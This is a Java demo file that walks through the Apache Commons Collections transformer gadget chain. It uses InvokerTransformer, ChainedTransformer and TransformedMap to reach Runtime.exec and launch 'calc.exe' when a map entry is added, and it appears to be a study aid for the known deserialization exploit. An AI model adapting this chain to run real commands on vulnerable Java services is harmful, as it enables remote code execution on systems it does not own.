
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;


public class TranformerDemo {

    public static void main(String[] args){
        //Transformer test
        Transformer trantest = new Transformer() {
            @Override
            public Object transform(Object input) {
                System.out.println( input.getClass() );
                return null;
            }
        };
        trantest.transform( Runtime.class );

        //ConstantTransformer test
        ConstantTransformer constanttran = new ConstantTransformer( Runtime.class );

        //InvokerTransformer test
        InvokerTransformer tran = new InvokerTransformer( "getMethod", new Class[]{
                String.class, Class[].class}, new Object[]{
                "getRuntime", null} );

        Method method = (Method) tran.transform( Runtime.class );
        InvokerTransformer tran2 = new InvokerTransformer( "invoke", new Class[]{
                Object.class, Object[].class }, new Object[]{
                null, null});

        Runtime run = (Runtime) tran2.transform( method );
        InvokerTransformer tran3 = new InvokerTransformer( "exec", new Class[]{
                String.class}, new Object[]{
                "calc.exe"});
        tran3.transform( run );

        //ChainedTransformer test
        ChainedTransformer chain = null;
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer( Runtime.class ),
                new InvokerTransformer( "getMethod", new Class[]{ String.class, Class[].class},
                        new Object[]{ "getRuntime", null} ),
                new InvokerTransformer( "invoke", new Class[]{ Object.class, Object[].class },
                        new Object[]{ null, null}),

                new InvokerTransformer( "exec", new Class[]{ String.class},
                        new Object[] { "calc.exe" }) };

        chain = new ChainedTransformer( transformers );
        //chain.transform( Object.class );

        System.out.println( tran.transform( Runtime.class ).toString() );

        Map m = new HashMap();
        m.put( "1", "1" );
        Map map = TransformedMap.decorate(m, null, chain );
        map.put( "a", "b" );
        //Map.Entry entry = (Map.Entry) map.entrySet().iterator().next();
        //entry.setValue( "test" );

        //((Runtime)Runtime.class.getMethod( "getRuntime", null) .invoke( null, null )).exec( "cal.exe" );

    }

}
